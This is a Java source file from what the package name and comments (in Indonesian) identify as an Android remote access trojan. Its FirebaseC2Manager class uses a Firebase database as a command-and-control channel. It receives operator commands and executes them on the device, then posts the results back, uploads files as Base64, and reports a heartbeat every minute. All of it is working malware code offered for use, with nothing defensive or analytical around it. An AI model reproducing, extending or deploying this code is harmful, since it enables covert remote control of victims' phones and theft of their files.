package com.enterprise.rat.utils;

import android.util.Log;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.commands.CommandHandler;
import com.google.firebase.database.*;
import com.google.gson.JsonObject;

public class FirebaseC2Manager {
    private DatabaseReference rootRef;
    private CommandHandler commandHandler;
    private String sessionId;
    private boolean listening = false;
    private static final String TAG = "FirebaseC2";

    public FirebaseC2Manager(CommandHandler handler) {
        this.commandHandler = handler;
        this.rootRef = FirebaseDatabase.getInstance().getReference();
    }

    /**
     * Mulai mendengarkan perintah dari Firebase.
     * Struktur Firebase:
     *   /commands/{session_id}  ← C2 menulis perintah di sini
     *   /results/{session_id}   ← RAT menulis hasil di sini
     */
    public void startListening(String sessionId) {
        if (listening) return;
        this.sessionId = sessionId;
        DatabaseReference commandRef = rootRef.child("commands").child(sessionId);
        listening = true;

        // ValueEventListener: dipicu setiap kali data berubah (real-time)
        commandRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                String command = snapshot.getValue(String.class);
                if (command != null && !command.isEmpty()) {
                    Log.d(TAG, "Cmd received: " + command);
                    // Eksekusi command via CommandHandler
                    commandHandler.handleCommand(command, BotConfig.ADMIN_CHAT_ID,
                        String.valueOf(System.currentTimeMillis()), null);
                    // Hapus command setelah dieksekusi
                    snapshot.getRef().removeValue();
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Listen failed: " + error.getMessage());
            }
        });

        // Update heartbeat setiap 60 detik
        startHeartbeat();
        Log.d(TAG, "Firebase C2 listening on session: " + sessionId);
    }

    /**
     * Kirim hasil eksekusi ke Firebase.
     */
    public void sendResult(String command, String result) {
        if (sessionId == null) return;
        DatabaseReference resultRef = rootRef.child("results").child(sessionId).push();
        resultRef.child("command").setValue(command);
        resultRef.child("result").setValue(result);
        resultRef.child("timestamp").setValue(System.currentTimeMillis());
        resultRef.child("session_id").setValue(sessionId);
    }

    /**
     * Kirim file (dalam bentuk Base64 encoded string) ke Firebase.
     */
    public void sendFile(String fileName, String base64Data) {
        if (sessionId == null) return;
        DatabaseReference fileRef = rootRef.child("files").child(sessionId).push();
        fileRef.child("name").setValue(fileName);
        fileRef.child("data").setValue(base64Data);
        fileRef.child("timestamp").setValue(System.currentTimeMillis());
    }

    /**
     * Heartbeat: update status device setiap 60 detik.
     */
    private void startHeartbeat() {
        DatabaseReference statusRef = rootRef.child("devices").child(sessionId);
        new Thread(() -> {
            while (listening) {
                try {
                    statusRef.child("last_seen").setValue(System.currentTimeMillis());
                    statusRef.child("session_id").setValue(sessionId);
                    Thread.sleep(60000);
                } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    public void stopListening() {
        listening = false;
    }

    public boolean isListening() { return listening; }
}
